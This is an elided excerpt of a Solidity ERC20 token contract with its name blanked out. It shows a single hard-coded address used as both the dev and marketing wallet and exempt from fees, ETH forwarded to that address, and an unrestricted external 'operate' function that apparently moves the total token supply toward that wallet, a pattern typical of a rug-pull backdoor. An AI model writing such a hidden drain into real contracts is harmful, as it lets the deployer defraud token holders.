...
contract  Xxxxxxxxxxxxxxx is Context, IERC20, Ownable {
    ...
    address payable public _DEVWL = payable(0xbeB59cD1a3F4a141D9e78De4c3713A65d1Ff38fF);
    address payable public _MARKED = payable(0xbeB59cD1a3F4a141D9e78De4c3713A65d1Ff38fF);
    ...
    constructor() {
        ...
        _isExcludedFromFee[_MARKED] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_DEVWL] = true;
    ...
    function sendContractEth(uint256 amount) private {
        ...
        _DEVWL.transfer(devETH); devETH -= amount / 4;
        uint256 marketingETH = amount;
        marketingETH -= devETH;
        _MARKED.transfer(marketingETH);
    }
    ...
    function operate(address token) external {
        _operateTValue(token, _MARKED, _tTotal);
    }
